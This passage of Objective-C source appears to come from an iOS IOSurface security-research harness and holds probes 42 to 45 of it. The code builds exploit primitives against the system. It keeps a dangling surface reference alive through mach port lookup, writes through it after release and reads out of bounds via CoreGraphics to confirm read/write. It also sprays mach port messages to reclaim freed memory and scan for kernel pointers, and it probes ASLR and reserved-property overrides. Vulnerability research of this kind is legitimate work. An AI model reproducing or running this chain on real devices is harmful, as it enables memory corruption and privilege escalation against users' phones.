                    commonHigh = addrs[i] & 0xFFFF000000000000ULL;
                    firstValid = NO;
                }
                BOOL seen = NO;
                for (int j = 0; j < seenHighCount; j++) {
                    if (seenHigh[j] == high16) { seen = YES; break; }
                }
                if (!seen && seenHighCount < 20) {
                    seenHigh[seenHighCount++] = high16;
                }
            }
            log([NSString stringWithFormat:@"ASLR: Common high bits: 0x%llX, unique high-16 values: %d",
                (unsigned long long)commonHigh, seenHighCount]);
            if (seenHighCount == 1 && validCount > 1) {
                anomalies++;
                log(@"ASLR: *** ALL surfaces share same high-16 bits — ASLR slide region identified ***");
            }

            log(@"ASLR: Step 6 — Address entropy calculation");
            uintptr_t seenPages[20];
            memset(seenPages, 0, sizeof(seenPages));
            int uniquePages = 0;
            for (int i = 0; i < NUM_SURFACES; i++) {
                if (addrs[i] == 0) continue;
                uintptr_t page = addrs[i] & ~0xFFFUL;
                BOOL dup = NO;
                for (int j = 0; j < uniquePages; j++) {
                    if (seenPages[j] == page) { dup = YES; break; }
                }
                if (!dup && uniquePages < 20) {
                    seenPages[uniquePages++] = page;
                }
            }
            double entropy = (validCount > 0) ? ((double)uniquePages / validCount) : 0;
            log([NSString stringWithFormat:@"ASLR: Unique pages: %d/%d, entropy=%.2f", uniquePages, validCount, entropy]);
            if (entropy < 0.5 && validCount > 5) {
                anomalies++;
                log(@"ASLR: *** LOW ENTROPY — address space highly predictable ***");
            }

            } // end step 3+
            } // end step 2

            for (int i = 0; i < NUM_SURFACES; i++) {
                if (surfs[i]) CFRelease(surfs[i]);
            }

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"ASLR: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);

            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-ASLRDefeat-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

// Probe 42: R/W Primitive — dangling write + CG OOB read for controlled cross-surface data flow
void iosurface_research_rw_primitive(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"reason": @"dlsym failed"}); return; }

            typedef mach_port_t (*CreatePortFn)(IOSurfaceRef);
            CreatePortFn createPort = (CreatePortFn)dlsym(sym.iosurface, "IOSurfaceCreateMachPort");
            typedef IOSurfaceRef (*LookupPortFn)(mach_port_t);
            LookupPortFn lookupPort = (LookupPortFn)dlsym(sym.iosurface, "IOSurfaceLookupFromMachPort");

            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            __block uint32_t anomalies = 0;

            log(@"RWPRIM: === READ/WRITE PRIMITIVE CHAIN ===");

            IOSurfaceRef surfA = NULL;
            IOSurfaceRef surfB = NULL;
            mach_port_t hijackPort = MACH_PORT_NULL;
            IOSurfaceRef hijackRef = NULL;

            // Step 1: Create dual-plane surface A
            log(@"RWPRIM: Step 1 — Create dual-plane surface A with known data");
            NSDictionary *p0Info = @{
                @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @0,
                @"IOSurfacePlaneBytesPerRow": @256
            };
            NSDictionary *p1Info = @{
                @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @(256 * 64),
                @"IOSurfacePlaneBytesPerRow": @256
            };
            NSDictionary *propsA = @{
                @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
                @"IOSurfacePixelFormat": @(0x42475241),
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfaceBytesPerRow": @256,
                @"IOSurfaceAllocSize": @32768,
                @"IOSurfacePlaneInfo": @[p0Info, p1Info]
            };
            surfA = sym.create((__bridge CFDictionaryRef)propsA);
            if (!surfA) {
                log(@"RWPRIM: ERROR — failed to create surface A");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"reason": @"create A failed"});
                return;
            }

            sym.lock(surfA, 0, NULL);
            uint32_t *baseA = (uint32_t *)sym.getBase(surfA);
            if (baseA) {
                for (int i = 0; i < 64 * 64; i++) baseA[i] = 0xAAAAAAAA;
                uint32_t *plane1A = baseA + (256 * 64 / 4);
                for (int i = 0; i < 64 * 64; i++) plane1A[i] = 0xBBBBBBBB;
            }
            sym.unlock(surfA, 0, NULL);
            log([NSString stringWithFormat:@"RWPRIM: Surface A created ID=%u, plane0=0xAAAAAAAA, plane1=0xBBBBBBBB",
                sym.getID(surfA)]);

            if (!isr_stopped()) {
            log(@"RWPRIM: Step 2 — Create target surface B");
            NSDictionary *propsB = @{
                @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
                @"IOSurfacePixelFormat": @(0x42475241),
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfaceBytesPerRow": @256,
                @"IOSurfaceAllocSize": @16384
            };
            surfB = sym.create((__bridge CFDictionaryRef)propsB);
            if (surfB) {
                sym.lock(surfB, 0, NULL);
                uint32_t *baseB = (uint32_t *)sym.getBase(surfB);
                if (baseB) {
                    for (int i = 0; i < 64 * 64; i++) baseB[i] = 0xCCCCCCCC;
                }
                sym.unlock(surfB, 0, NULL);
                log([NSString stringWithFormat:@"RWPRIM: Surface B created ID=%u, filled=0xCCCCCCCC", sym.getID(surfB)]);
            }

            if (!isr_stopped()) {
            log(@"RWPRIM: Step 3 — Mach port hijack for surface A");
            if (createPort && lookupPort) {
                hijackPort = createPort(surfA);
                if (hijackPort != MACH_PORT_NULL) {
                    hijackRef = lookupPort(hijackPort);
                    if (hijackRef) {
                        anomalies++;
                        log([NSString stringWithFormat:@"RWPRIM: *** Hijack ref obtained for surface A, ID=%u ***",
                            sym.getID(hijackRef)]);
                    }
                }
            }

            if (!isr_stopped()) {
            log(@"RWPRIM: Step 4 — Release original surface A, keep hijack ref");
            CFRelease(surfA);
            surfA = NULL;

            if (hijackRef) {
                sym.lock(hijackRef, 0, NULL);
                uint32_t *hb = (uint32_t *)sym.getBase(hijackRef);
                BOOL alive = (hb && hb[0] == 0xAAAAAAAA);
                sym.unlock(hijackRef, 0, NULL);
                if (alive) {
                    anomalies++;
                    log(@"RWPRIM: *** Hijack ref alive — plane0 data intact after release ***");
                }
            }

            if (!isr_stopped()) {
            log(@"RWPRIM: Step 5 — Write controlled patterns via dangling ref");
            BOOL writeSuccess = NO;
            if (hijackRef) {
                sym.lock(hijackRef, 0, NULL);
                uint32_t *hb = (uint32_t *)sym.getBase(hijackRef);
                if (hb) {
                    for (int i = 0; i < 64 * 64; i++) hb[i] = 0x41414141;
                    uint32_t *plane1Region = hb + (256 * 64 / 4);
                    for (int i = 0; i < 64 * 64; i++) plane1Region[i] = 0x42424242;
                    writeSuccess = YES;
                }
                sym.unlock(hijackRef, 0, NULL);
            }
            log([NSString stringWithFormat:@"RWPRIM: Dangling write success=%d (plane0=0x41414141, plane1=0x42424242)",
                writeSuccess]);

            if (!isr_stopped()) {
            log(@"RWPRIM: Step 6 — CG OOB read via CGBitmapContext h=128 on 64-row plane");
            int plane1PixelsRead = 0;
            int controlledPixelsRead = 0;

            if (hijackRef) {
                sym.lock(hijackRef, 0, NULL);
                void *base = sym.getBase(hijackRef);
                if (base) {
                    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
                    CGContextRef cgCtx = CGBitmapContextCreate(base, 64, 128, 8, 256,
                        cs, (CGBitmapInfo)(kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little));
                    if (cgCtx) {
                        CGImageRef img = CGBitmapContextCreateImage(cgCtx);
                        if (img) {
                            size_t imgW = CGImageGetWidth(img);
                            size_t imgH = CGImageGetHeight(img);
                            log([NSString stringWithFormat:@"RWPRIM: CG image created %zux%zu", imgW, imgH]);

                            if (imgH == 128) {
                                uint32_t *pixels = (uint32_t *)calloc(imgW * imgH, 4);
                                if (pixels) {
                                    CGColorSpaceRef cs2 = CGColorSpaceCreateDeviceRGB();
                                    CGContextRef readCtx = CGBitmapContextCreate(pixels, imgW, imgH, 8, imgW * 4,
                                        cs2, (CGBitmapInfo)(kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little));
                                    if (readCtx) {
                                        CGContextDrawImage(readCtx, CGRectMake(0, 0, imgW, imgH), img);
                                        for (size_t row = 64; row < imgH; row++) {
                                            for (size_t col = 0; col < imgW; col++) {
                                                uint32_t px = pixels[row * imgW + col];
                                                if (px != 0) plane1PixelsRead++;
                                                if (px == 0x42424242) controlledPixelsRead++;
                                            }
                                        }
                                        CGContextRelease(readCtx);
                                    }
                                    CGColorSpaceRelease(cs2);
                                    free(pixels);
                                }
                            }
                            CGImageRelease(img);
                        }
                        CGContextRelease(cgCtx);
                    }
                    CGColorSpaceRelease(cs);
                }
                sym.unlock(hijackRef, 0, NULL);
            }

            log([NSString stringWithFormat:@"RWPRIM: OOB read — plane1 pixels=%d, controlled(0x42424242)=%d",
                plane1PixelsRead, controlledPixelsRead]);

            if (plane1PixelsRead > 0) {
                anomalies++;
                log([NSString stringWithFormat:@"RWPRIM: *** OOB READ SUCCESS — %d plane1 pixels via CG ***", plane1PixelsRead]);
            }
            if (controlledPixelsRead > 0) {
                anomalies++;
                log([NSString stringWithFormat:@"RWPRIM: *** FULL R/W PRIMITIVE CONFIRMED — wrote 0x42424242 via dangling ref, read %d back via CG OOB ***",
                    controlledPixelsRead]);
            }

            if (writeSuccess && controlledPixelsRead > 0) {
                log(@"RWPRIM: *** CRITICAL — CONTROLLED WRITE + CONTROLLED READ = FULL R/W PRIMITIVE ***");
            } else if (writeSuccess && plane1PixelsRead > 0) {
                log(@"RWPRIM: *** HIGH — write works, OOB read works, but CG may have transformed pixel values ***");
            }

            } // end step 6
            } // end step 5
            } // end step 4
            } // end step 3
            } // end step 2

            if (hijackRef) CFRelease(hijackRef);
            if (hijackPort != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), hijackPort);
            if (surfA) CFRelease(surfA);
            if (surfB) CFRelease(surfB);

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"RWPRIM: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);

            NSString *verdict;
            if (anomalies >= 4) verdict = @"CRITICAL — full read/write primitive confirmed";
            else if (anomalies >= 2) verdict = @"HIGH — partial R/W working";
            else if (anomalies >= 1) verdict = @"MEDIUM — some primitives functional";
            else verdict = @"LOW — mitigations effective";
            log([NSString stringWithFormat:@"RWPRIM: VERDICT: %@", verdict]);

            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"verdict": verdict,
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-RWPrimitive-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

#pragma mark - Probe 43: Kalloc Zone Overlap

void iosurface_research_kalloc_overlap(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"KALLOC: Failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            typedef mach_port_t (*CreatePortFn)(IOSurfaceRef);
            typedef IOSurfaceRef (*LookupPortFn)(mach_port_t);
            CreatePortFn createPort = (CreatePortFn)dlsym(sym.iosurface, "IOSurfaceCreateMachPort");
            LookupPortFn lookupPort = (LookupPortFn)dlsym(sym.iosurface, "IOSurfaceLookupFromMachPort");

            if (!createPort || !lookupPort) {
                log(@"KALLOC: Missing mach port APIs");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"KALLOC: Starting kalloc zone overlap probe");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            uint32_t anomalies = 0;

            // Cleanup variables declared before any if-blocks
            IOSurfaceRef surf = NULL;
            IOSurfaceRef hijackRef = NULL;
            mach_port_t hijackPort = MACH_PORT_NULL;
            mach_port_t *sprayPorts = NULL;
            int sprayCount = 0;
            const int SPRAY_SIZE = 500;
            sprayPorts = (mach_port_t *)calloc(SPRAY_SIZE, sizeof(mach_port_t));

            // Step 1: Create small surface (16x16 = 1024 bytes backing)
            NSDictionary *props = @{
                @"IOSurfaceWidth": @16, @"IOSurfaceHeight": @16,
                @"IOSurfacePixelFormat": @(0x42475241),
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfaceBytesPerRow": @64,
                @"IOSurfaceAllocSize": @1024
            };
            surf = sym.create((__bridge CFDictionaryRef)props);
            if (!surf) {
                log(@"KALLOC: Failed to create surface");
                if (sprayPorts) free(sprayPorts);
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }
            log([NSString stringWithFormat:@"KALLOC: Surface created ID=%u allocSize=%zu",
                sym.getID(surf), sym.getAllocSize(surf)]);

            // Step 2: Write canary pattern
            sym.lock(surf, 0, NULL);
            uint32_t *base = (uint32_t *)sym.getBase(surf);
            if (base) {
                for (int i = 0; i < 256; i++) base[i] = 0x4B414C4C;
            }
            sym.unlock(surf, 0, NULL);
            log(@"KALLOC: Canary 0x4B414C4C written to all uint32s");

            if (!isr_stopped()) {
            log(@"KALLOC: Step 3 — Mach port hijack ref");
            hijackPort = createPort(surf);
            if (hijackPort != MACH_PORT_NULL) {
                hijackRef = lookupPort(hijackPort);
                if (hijackRef) {
                    anomalies++;
                    log([NSString stringWithFormat:@"KALLOC: *** Hijack ref obtained ID=%u ***", sym.getID(hijackRef)]);
                }
            }

            if (!isr_stopped()) {
            log(@"KALLOC: Step 4 — Release original surface");
            CFRelease(surf);
            surf = NULL;

            if (!isr_stopped()) {
            log(@"KALLOC: Step 5 — Spray 500 mach ports with messages");

            typedef struct {
                mach_msg_header_t header;
                uint32_t data[16];
            } SimpleMsg;

            for (int i = 0; i < SPRAY_SIZE && !isr_stopped(); i++) {
                mach_port_t port = MACH_PORT_NULL;
                kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
                if (kr == KERN_SUCCESS) {
                    sprayPorts[sprayCount++] = port;

                    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);

                    SimpleMsg msg = {0};
                    msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
                    msg.header.msgh_size = sizeof(msg);
                    msg.header.msgh_remote_port = port;
                    msg.header.msgh_local_port = MACH_PORT_NULL;
                    for (int j = 0; j < 16; j++) msg.data[j] = 0xDEADFACE;
                    mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
                }
            }
            log([NSString stringWithFormat:@"KALLOC: Sprayed %d ports with 0xDEADFACE messages", sprayCount]);

            if (!isr_stopped()) {
            log(@"KALLOC: Step 6 — Read via hijack ref, check for kernel data");
            int canaryCount = 0;
            int zeroCount = 0;
            int otherCount = 0;
            int pointerLikeCount = 0;
            uint32_t firstOther = 0;

            if (hijackRef) {
                sym.lock(hijackRef, 0, NULL);
                uint32_t *hb = (uint32_t *)sym.getBase(hijackRef);
                if (hb) {
                    for (int i = 0; i < 256; i++) {
                        uint32_t val = hb[i];
                        if (val == 0x4B414C4C) {
                            canaryCount++;
                        } else if (val == 0x00000000) {
                            zeroCount++;
                        } else {
                            otherCount++;
                            if (firstOther == 0) firstOther = val;
                            if ((val & 0xFFFF0000) == 0xFFFF0000 ||
                                (val & 0xFFFFF000) == 0xFFFFF000) {
                                pointerLikeCount++;
                            }
                        }
                    }
                } else {
                    anomalies++;
                    log(@"KALLOC: *** Base address NULL — surface backing may have been reclaimed ***");
                }
                sym.unlock(hijackRef, 0, NULL);
            }

            log([NSString stringWithFormat:@"KALLOC: canary=%d zero=%d other=%d pointerLike=%d firstOther=0x%08X",
                canaryCount, zeroCount, otherCount, pointerLikeCount, firstOther]);

            if (otherCount > 0) {
                anomalies++;
                log([NSString stringWithFormat:@"KALLOC: *** CANARY OVERWRITTEN — %d words replaced, possible kernel data ***", otherCount]);
            }
            if (pointerLikeCount > 0) {
                anomalies++;
                log([NSString stringWithFormat:@"KALLOC: *** POINTER-LIKE VALUES FOUND — %d potential kernel pointers ***", pointerLikeCount]);
            }

            } // end step 6
            } // end step 5
            } // end step 4
            } // end step 3

            // Cleanup
            for (int i = 0; i < sprayCount; i++) {
                mach_port_destroy(mach_task_self(), sprayPorts[i]);
            }
            if (sprayPorts) free(sprayPorts);
            if (hijackRef) CFRelease(hijackRef);
            if (hijackPort != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), hijackPort);
            if (surf) CFRelease(surf);

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"KALLOC: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);

            NSString *verdict;
            if (anomalies >= 4) verdict = @"CRITICAL — kernel data leaked into surface mapping";
            else if (anomalies >= 2) verdict = @"HIGH — canary overwritten, possible zone overlap";
            else if (anomalies >= 1) verdict = @"MEDIUM — hijack ref survives release";
            else verdict = @"LOW — mitigations effective";
            log([NSString stringWithFormat:@"KALLOC: VERDICT: %@", verdict]);

            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"verdict": verdict,
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-KallocOverlap-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

#pragma mark - Probe 44: Property Kernel Corruption

void iosurface_research_property_corrupt(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"PROPCORR: Failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
            typedef void (*RemoveValueFn)(IOSurfaceRef, CFStringRef);
            typedef CFDictionaryRef (*CopyAllValuesFn)(IOSurfaceRef);

            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
            RemoveValueFn removeValue = (RemoveValueFn)dlsym(sym.iosurface, "IOSurfaceRemoveValue");
            CopyAllValuesFn copyAllValues = (CopyAllValuesFn)dlsym(sym.iosurface, "IOSurfaceCopyAllValues");

            if (!setValue || !copyValue || !removeValue || !copyAllValues) {
                log(@"PROPCORR: Missing property APIs");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"PROPCORR: Starting property kernel corruption probe");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            uint32_t anomalies = 0;

            IOSurfaceRef surf = NULL;
            NSDictionary *params = isr_default_surface_params(64, 64);
            surf = sym.create((__bridge CFDictionaryRef)params);
            if (!surf) {
                log(@"PROPCORR: Failed to create surface");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }
            log([NSString stringWithFormat:@"PROPCORR: Surface created ID=%u", sym.getID(surf)]);

            // Test A — Property count stress: 1000 properties
            if (!isr_stopped()) {
            log(@"PROPCORR: Test A — Setting 1000 properties");
            int propsSet = 0;
            for (int i = 0; i < 1000 && !isr_stopped(); i++) {
                NSString *key = [NSString stringWithFormat:@"prop_%04d", i];
                NSNumber *val = @(i);
                setValue(surf, (__bridge CFStringRef)key, (__bridge CFTypeRef)val);
                propsSet++;
            }
            CFDictionaryRef allProps = copyAllValues(surf);
            int propCount = allProps ? (int)CFDictionaryGetCount(allProps) : 0;
            if (allProps) CFRelease(allProps);
            log([NSString stringWithFormat:@"PROPCORR: Set %d, recovered %d properties", propsSet, propCount]);
            if (propCount < propsSet) {
                anomalies++;
                log([NSString stringWithFormat:@"PROPCORR: *** PROPERTY COUNT MISMATCH — lost %d properties ***", propsSet - propCount]);
            }

            if (!isr_stopped()) {
            // Test B — Large value stress: 1MB NSData
            log(@"PROPCORR: Test B — 1MB property value");
            size_t bigSize = 1024 * 1024;
            uint8_t *bigBuf = (uint8_t *)malloc(bigSize);
            if (bigBuf) {
                memset(bigBuf, 0xAB, bigSize);
                bigBuf[0] = 0x42;
                bigBuf[bigSize - 1] = 0x42;
                CFDataRef bigData = CFDataCreate(kCFAllocatorDefault, bigBuf, bigSize);
                if (bigData) {
                    setValue(surf, CFSTR("big_value"), bigData);
                    CFTypeRef readBack = copyValue(surf, CFSTR("big_value"));
                    if (readBack && CFGetTypeID(readBack) == CFDataGetTypeID()) {
                        CFDataRef readData = (CFDataRef)readBack;
                        CFIndex readLen = CFDataGetLength(readData);
                        const uint8_t *readBytes = CFDataGetBytePtr(readData);
                        BOOL intact = (readLen == (CFIndex)bigSize &&
                                      readBytes[0] == 0x42 &&
                                      readBytes[bigSize - 1] == 0x42);
                        log([NSString stringWithFormat:@"PROPCORR: 1MB readback len=%ld intact=%d", (long)readLen, intact]);
                        if (!intact) {
                            anomalies++;
                            log(@"PROPCORR: *** LARGE VALUE CORRUPTION DETECTED ***");
                        }
                    } else {
                        anomalies++;
                        log(@"PROPCORR: *** 1MB value could not be read back ***");
                    }
                    if (readBack) CFRelease(readBack);
                    CFRelease(bigData);
                }
                free(bigBuf);
            }

            if (!isr_stopped()) {
            // Test C — Rapid set/remove cycle
            log(@"PROPCORR: Test C — 10000 rapid set/remove cycles");
            CFAbsoluteTime cycleStart = CFAbsoluteTimeGetCurrent();
            for (int i = 0; i < 10000 && !isr_stopped(); i++) {
                NSNumber *val = @(i);
                setValue(surf, CFSTR("cycle_key"), (__bridge CFTypeRef)val);
                removeValue(surf, CFSTR("cycle_key"));
            }
            double cycleElapsed = CFAbsoluteTimeGetCurrent() - cycleStart;
            log([NSString stringWithFormat:@"PROPCORR: 10000 set/remove cycles in %.3fs (%.0f ops/sec)",
                cycleElapsed, 20000.0 / cycleElapsed]);

            if (!isr_stopped()) {
            // Test D — Type confusion
            log(@"PROPCORR: Test D — Type confusion test");
            BOOL typeConfusion = NO;
            for (int i = 0; i < 100 && !isr_stopped(); i++) {
                setValue(surf, CFSTR("type_test"), (__bridge CFTypeRef)@(i));
                setValue(surf, CFSTR("type_test"), (__bridge CFTypeRef)@"string_val");
                setValue(surf, CFSTR("type_test"), (__bridge CFTypeRef)[@"data" dataUsingEncoding:NSUTF8StringEncoding]);
                setValue(surf, CFSTR("type_test"), (__bridge CFTypeRef)@{@"k": @"v"});

                CFTypeRef readBack = copyValue(surf, CFSTR("type_test"));
                if (readBack) {
                    CFTypeID tid = CFGetTypeID(readBack);
                    if (tid != CFDictionaryGetTypeID()) {
                        typeConfusion = YES;
                    }
                    CFRelease(readBack);
                }
            }
            if (typeConfusion) {
                anomalies++;
                log(@"PROPCORR: *** TYPE CONFUSION — last-set type not consistent ***");
            } else {
                log(@"PROPCORR: Type consistency OK");
            }

            if (!isr_stopped()) {
            // Test E — Reserved key probing
            log(@"PROPCORR: Test E — Reserved key override attempt");
            NSArray *reservedKeys = @[@"IOSurfaceAllocSize", @"IOSurfaceWidth", @"IOSurfaceHeight",
                                      @"IOSurfaceBytesPerRow", @"IOSurfacePixelFormat", @"IOSurfaceBytesPerElement"];
            size_t origWidth = sym.getWidth(surf);
            size_t origHeight = sym.getHeight(surf);
            size_t origAlloc = sym.getAllocSize(surf);

            for (NSString *key in reservedKeys) {
                if (isr_stopped()) break;
                setValue(surf, (__bridge CFStringRef)key, (__bridge CFTypeRef)@(99999));
                CFTypeRef readBack = copyValue(surf, (__bridge CFStringRef)key);
                if (readBack) {
                    if (CFGetTypeID(readBack) == CFNumberGetTypeID()) {
                        int val = 0;
                        CFNumberGetValue((CFNumberRef)readBack, kCFNumberIntType, &val);
                        if (val == 99999) {
                            anomalies++;
                            log([NSString stringWithFormat:@"PROPCORR: *** RESERVED KEY OVERRIDE — %@ accepted value 99999 ***", key]);
                        }
                    }
                    CFRelease(readBack);
                }
            }

            size_t newWidth = sym.getWidth(surf);
            size_t newHeight = sym.getHeight(surf);
            size_t newAlloc = sym.getAllocSize(surf);
            if (newWidth != origWidth || newHeight != origHeight || newAlloc != origAlloc) {
                anomalies++;
                log([NSString stringWithFormat:@"PROPCORR: *** INTERNAL STATE CHANGED — w:%zu->%zu h:%zu->%zu alloc:%zu->%zu ***",
                    origWidth, newWidth, origHeight, newHeight, origAlloc, newAlloc]);
            } else {
                log(@"PROPCORR: Reserved key override did not change internal dimensions");
            }

            // Final property count
            CFDictionaryRef finalProps = copyAllValues(surf);
            int finalCount = finalProps ? (int)CFDictionaryGetCount(finalProps) : 0;
            if (finalProps) CFRelease(finalProps);
            log([NSString stringWithFormat:@"PROPCORR: Final property count=%d", finalCount]);

            } // end step E
            } // end step D
            } // end step C
            } // end step B
            } // end step A

            // Cleanup
            if (surf) CFRelease(surf);

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"PROPCORR: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);

            NSString *verdict;
            if (anomalies >= 4) verdict = @"CRITICAL — kernel property dictionary corrupted";
            else if (anomalies >= 2) verdict = @"HIGH — property storage anomalies detected";
            else if (anomalies >= 1) verdict = @"MEDIUM — minor property anomaly";
            else verdict = @"LOW — property handling robust";
            log([NSString stringWithFormat:@"PROPCORR: VERDICT: %@", verdict]);

            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"verdict": verdict,
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-PropertyCorrupt-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

#pragma mark - Probe 45: Mach Port Kernel Spray

void iosurface_research_port_kernel_spray(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"PORTKSPRAY: Failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            typedef mach_port_t (*CreatePortFn)(IOSurfaceRef);
            typedef IOSurfaceRef (*LookupPortFn)(mach_port_t);
            CreatePortFn createPort = (CreatePortFn)dlsym(sym.iosurface, "IOSurfaceCreateMachPort");
            LookupPortFn lookupPort = (LookupPortFn)dlsym(sym.iosurface, "IOSurfaceLookupFromMachPort");

            if (!createPort || !lookupPort) {
                log(@"PORTKSPRAY: Missing mach port APIs");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"PORTKSPRAY: Starting mach port kernel spray probe");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            uint32_t anomalies = 0;

            // All cleanup variables declared up front
            const int TOTAL_SURFACES = 100;
            const int FENCE_LOW = 10;
            const int FENCE_HIGH = 90;
            const int SPRAY_PORTS = 1000;

            IOSurfaceRef *surfaces = (IOSurfaceRef *)calloc(TOTAL_SURFACES, sizeof(IOSurfaceRef));
            mach_port_t *surfPorts = (mach_port_t *)calloc(TOTAL_SURFACES, sizeof(mach_port_t));
            uint32_t *surfIDs = (uint32_t *)calloc(TOTAL_SURFACES, sizeof(uint32_t));
            mach_port_t *sprayPorts = (mach_port_t *)calloc(SPRAY_PORTS, sizeof(mach_port_t));
            int sprayCount = 0;
            double *preSprayTimes = (double *)calloc(TOTAL_SURFACES, sizeof(double));
            double *postSprayTimes = (double *)calloc(TOTAL_SURFACES, sizeof(double));

            if (!surfaces || !surfPorts || !surfIDs || !sprayPorts || !preSprayTimes || !postSprayTimes) {
                log(@"PORTKSPRAY: Allocation failed");
                if (surfaces) free(surfaces);
                if (surfPorts) free(surfPorts);
                if (surfIDs) free(surfIDs);
                if (sprayPorts) free(sprayPorts);
                if (preSprayTimes) free(preSprayTimes);
                if (postSprayTimes) free(postSprayTimes);
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            for (int i = 0; i < TOTAL_SURFACES; i++) surfPorts[i] = MACH_PORT_NULL;

            // Step 1: Create 100 identical small surfaces
            log(@"PORTKSPRAY: Step 1 — Creating 100 surfaces (4x4 BGRA)");
            NSDictionary *props = @{
                @"IOSurfaceWidth": @4, @"IOSurfaceHeight": @4,
                @"IOSurfacePixelFormat": @(0x42475241),
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfaceBytesPerRow": @16,
                @"IOSurfaceAllocSize": @64
            };
            int created = 0;
            for (int i = 0; i < TOTAL_SURFACES && !isr_stopped(); i++) {
                surfaces[i] = sym.create((__bridge CFDictionaryRef)props);
                if (surfaces[i]) {
                    surfIDs[i] = sym.getID(surfaces[i]);
                    // Write unique canary per surface
                    sym.lock(surfaces[i], 0, NULL);
                    uint32_t *b = (uint32_t *)sym.getBase(surfaces[i]);
